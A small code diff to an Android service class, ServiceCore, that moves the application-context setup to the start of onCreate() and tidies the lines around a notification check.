@@ -27,6 +27,7 @@ public class ServiceCore extends Service {
 	@Override
 	public void onCreate() {
 		super.onCreate();
+		Status.setAppContext(getApplicationContext());
 		Messages.init(getApplicationContext());
 
 		if (Cfg.DEBUG) {
@@ -37,9 +38,7 @@ public class ServiceCore extends Service {
 			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
 		
-		needsNotification = Root.isNotificationNeeded();
-
-		Status.setAppContext(getApplicationContext());
+		needsNotification = Root.isNotificationNeeded();		
 
 		// E' sempre false se Cfg.ACTIVITY = false
 		if (needsNotification == true) {
